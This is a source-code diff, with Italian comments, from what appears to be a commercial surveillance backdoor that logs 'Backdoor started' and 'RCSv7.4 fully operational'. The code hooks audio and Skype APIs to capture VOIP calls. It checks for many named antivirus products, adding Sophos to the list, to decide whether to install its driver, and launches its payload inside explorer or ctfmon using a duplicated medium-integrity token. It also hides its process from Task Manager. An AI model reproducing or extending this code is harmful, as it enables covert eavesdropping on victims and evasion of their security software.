@@ -828,7 +828,6 @@ void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOO
 	//HMMAKE_HOOK(dwPid, "ShowWindow", PM_ShowWindow, ShowWindowData, PM_ShowWindow_setup, pServiceData, "user32.dll"); 
 
 	// --- PM per VOIP
-	HMMAKE_HOOK(dwPid, "WriteFile", PM_WriteFile, WriteFileData, PM_WriteFile_setup, pServiceData, "KERNEL32.dll");
 	HMMAKE_HOOK(dwPid, "waveOutWrite", PM_waveOutWrite, waveOutWriteData, PM_waveOutWrite_setup, pServiceData, "WINMM.dll");
 	HMMAKE_HOOK(dwPid, "waveInAddBuffer", PM_waveInUnprepareHeader, waveInUnprepareHeaderData, PM_waveInUnprepareHeader_setup, pServiceData, "WINMM.dll");
 	HMMAKE_HOOK(dwPid, "SendMessageTimeoutA", PM_SendMessage, SendMessageData, PM_SendMessage_setup, pServiceData, "user32.dll"); // per SKYPE
@@ -1075,6 +1074,39 @@ BOOL GetUserUniqueHash(BYTE *user_hash, DWORD hash_size)
 	return ret_val;
 }
 
+typedef struct  {
+	HWND proc_window;
+	DWORD pid;
+} proc_window_struct;
+
+BOOL CALLBACK IsProcWindow(HWND hwnd, LPARAM param) 
+{
+	proc_window_struct *pstr = (proc_window_struct *)param;
+	DWORD pid;
+	if (GetWindowLong(hwnd, GWL_HWNDPARENT) != NULL)
+		return TRUE;
+	if (!IsWindowVisible(hwnd))
+		return TRUE;
+	GetWindowThreadProcessId(hwnd, &pid);
+	if (pid == pstr->pid) {
+		pstr->proc_window = hwnd;
+		return FALSE;
+	}
+	return TRUE;
+}
+// Torna la finestra del processo "procname"
+HWND HM_GetProcessWindow(char *procname)
+{
+	proc_window_struct proc_window;
+	proc_window.proc_window = NULL;
+	proc_window.pid = HM_FindPid(procname, TRUE);
+	if (proc_window.pid == 0)
+		return NULL;
+
+	EnumWindows(IsProcWindow, (LPARAM)(&proc_window));
+	return proc_window.proc_window;
+}
+
 // Ritorna il nome del processo "pid"
 // Torna NULL se non ha trovato niente 
 // N.B. Se torna una stringa, va liberata
@@ -1235,6 +1267,7 @@ DWORD HM_FindPid(char *proc_name, BOOL my_flag)
 
 #define MAX_CMD_LINE 800
 typedef BOOL (WINAPI *CreateProcess_t) (LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
+typedef BOOL (WINAPI *CreateProcessAsUser_t) (HANDLE, LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
 typedef BOOL (WINAPI *CloseHandle_t) (HANDLE);
 typedef struct {
 	COMMONDATA;
@@ -1406,6 +1439,50 @@ void IndirectCreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS
 		pCreateProcess(NULL, cmd_line, 0, 0, FALSE, flags, 0, 0, si, pi);
 }
 
+void IndirectCreateProcessAsUser(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, HANDLE hToken)
+{
+	HMODULE hmod = NULL;
+	CreateProcessAsUser_t pCreateProcessAsUser = NULL;
+
+	if (!hToken)
+		return IndirectCreateProcess(cmd_line, flags, si, pi);
+
+	hmod = GetModuleHandle("advapi32.dll");
+	if (hmod)
+		pCreateProcessAsUser = (CreateProcessAsUser_t)HM_SafeGetProcAddress(hmod, "CreateProcessAsUserA");
+	if (pCreateProcessAsUser)
+		pCreateProcessAsUser(hToken, NULL, cmd_line, 0, 0, FALSE, flags, 0, 0, si, pi);
+}
+
+
+HANDLE GetMediumLevelToken()
+{
+	HANDLE hToken;
+	HANDLE hNewToken = NULL;
+
+	// Medium integrity SID
+	WCHAR wszIntegritySid[20] = L"S-1-16-8192";
+	PSID pIntegritySid = NULL;
+
+	TOKEN_MANDATORY_LABEL TIL = {0};
+	PROCESS_INFORMATION ProcInfo = {0};
+	STARTUPINFOW StartupInfo = {0};
+	ULONG ExitCode = 0;
+
+	if (OpenProcessToken(GetCurrentProcess(),MAXIMUM_ALLOWED, &hToken)) {
+		if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
+			if (ConvertStringSidToSidW(wszIntegritySid, &pIntegritySid)) {
+				TIL.Label.Attributes = SE_GROUP_INTEGRITY;
+				TIL.Label.Sid = pIntegritySid;
+				SetTokenInformation(hNewToken, TokenIntegrityLevel, &TIL, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(pIntegritySid));
+				LocalFree(pIntegritySid);
+			}
+		}
+		CloseHandle(hToken);
+	}
+	return hNewToken;
+}
+
 // Funzione richiamata dal dropper che sceglie il processo da usare per fare la 
 // CreateProcess e poi la invoca.
 extern "C" void __stdcall HIDING(void);
@@ -1419,7 +1496,7 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 	// Decide se e dove copiare il driver 
 	// (Se c'e' ZoneAlarm E ctfmon NON mette il driver)
 	if ( (IsVista(&dummy) || IsAvira() || IsDeepFreeze() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsZoneAlarm() || IsAshampoo() || IsEndPoint())
-		 && !(IsZoneAlarm() && HM_FindPid("ctfmon.exe", TRUE)) && !IsRising() && !IsADAware() && !IsSunBeltPF() && (!IsPCTools() || IsDeepFreeze()) && (!IsKaspersky() || IsDeepFreeze())) {
+		 && !(IsZoneAlarm() && HM_FindPid("ctfmon.exe", TRUE)) && !IsRising() && !IsADAware() && !IsSunBeltPF() && !IsSophos32() && (!IsPCTools() || IsDeepFreeze()) && (!IsKaspersky() || IsDeepFreeze())) {
 		WCHAR drv_path[DLLNAMELEN*2];
 
 		if (!HM_GuessNames()) {
@@ -1455,18 +1532,18 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 	}
 
 	// ---------------------------------------------
-	
+	HANDLE hToken = GetMediumLevelToken();
 	if (IsAVG_IS() || IsFSecure() || IsKaspersky()) {
 		char exp_cmd[512];
 		HM_ExpandStrings(cmd_line, exp_cmd, sizeof(exp_cmd));
-		IndirectCreateProcess(exp_cmd, flags, si, pi);
+		IndirectCreateProcessAsUser(exp_cmd, flags, si, pi, hToken);
 		//CreateProcess(NULL, exp_cmd, 0, 0, FALSE, flags, 0, 0, si, pi);
 	} else if (HM_FindPid("zlclient.exe", FALSE)) {
 		// Se c'e' zonealarm usa come host ctfmon,
 		// se questo non e' presente usa explorer
-		HM_CreateProcess(cmd_line, flags, si, pi, HM_FindPid("ctfmon.exe", TRUE));
+		HM_CreateProcessAsUser(cmd_line, flags, si, pi, HM_FindPid("ctfmon.exe", TRUE), hToken);
 	} else // Non c'e' zonealarm e usa explorer
-		HM_CreateProcess(cmd_line, flags, si, pi, 0);
+		HM_CreateProcessAsUser(cmd_line, flags, si, pi, 0, hToken);
 	HideDevice dev_unhook;
 	dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), FALSE);	
 }
@@ -1474,6 +1551,11 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 // Funzione per far eseguire CreateProcess a explorer (o a un altro processo specificato)
 // Se fallisce ritorna 0 come child_pid nella struttura PROCESS_INFORMATION
 void __stdcall HM_CreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, DWORD host_pid)
+{
+	HM_CreateProcessAsUser(cmd_line, flags, si, pi, host_pid, NULL);
+}
+
+void __stdcall HM_CreateProcessAsUser(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi, DWORD host_pid, HANDLE hToken)
 {
 	HMCreateProcessThreadDataStruct HMCreateProcessThreadData;
 	HMODULE hMod;
@@ -1513,7 +1595,7 @@ void __stdcall HM_CreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PR
 	// Se non trova un processo ospite, o se e' a 64bit, chiama la CreateProcess normale
 	if (!explorer_pid || IsX64Process(explorer_pid)) {
 		pi->hProcess = 0; pi->hThread = 0;
-		IndirectCreateProcess(HMCreateProcessThreadData.cmd_line, flags, si, pi);
+		IndirectCreateProcessAsUser(HMCreateProcessThreadData.cmd_line, flags, si, pi, hToken);
 		if (pi->hProcess)
 			CloseHandle(pi->hProcess);
 		if (pi->hThread)
@@ -2124,9 +2206,8 @@ BOOL HM_HookActiveProcesses()
 #define PROCESS_POLLED 6
 #define PROCESS_FREQUENTLY_POLLED 4
 
-void HM_StartPolling(void)
+DWORD WINAPI PollNewApps(DWORD dummy)
 {
-	MSG msg;
 	char *polled_name[PROCESS_POLLED];
 	DWORD i, loop_count = 0;
 	HANDLE hProcessSnap;
@@ -2142,11 +2223,8 @@ void HM_StartPolling(void)
 	polled_name[5] = "chrome.exe";
 
 	LOOP {
+		Sleep(HM_PTSLEEPTIME);
 		loop_count++;
-
-		// Usato solo per monitorare il messaggio di QUIT
-		// quando viene effettuato il logoff
-		HANDLE_SENT_MESSAGES(msg, HM_PTSLEEPTIME);
 
 		pe32.dwSize = sizeof( PROCESSENTRY32 );
 		if ( (hProcessSnap = FNC(CreateToolhelp32Snapshot)( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE ) 
@@ -2196,6 +2274,17 @@ void HM_StartPolling(void)
 			}
 		} while( FNC(Process32Next)( hProcessSnap, &pe32 ) );
 		CloseHandle( hProcessSnap );
+	}
+}
+
+void HM_StartPolling(void)
+{
+	DWORD dummy;
+	MSG msg;
+
+	HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PollNewApps, NULL, 0, &dummy);
+	LOOP {
+		HANDLE_SENT_MESSAGES(msg, 100);
 	}
 }
 
@@ -2402,7 +2491,7 @@ void __stdcall HM_sMain(void)
 	// Fa partire il sync manager 
 	SM_StartMonitorEvents();
 
-	REPORT_STATUS_LOG("\r\n RCSv7.2 fully operational\r\n\r\n");
+	REPORT_STATUS_LOG("\r\n RCSv7.4 fully operational\r\n\r\n");
 	SendStatusLog(L"[Core Module]: Backdoor started");
 
 	// Ciclo per l'hiding da task manager e dai nuovi epxlorer
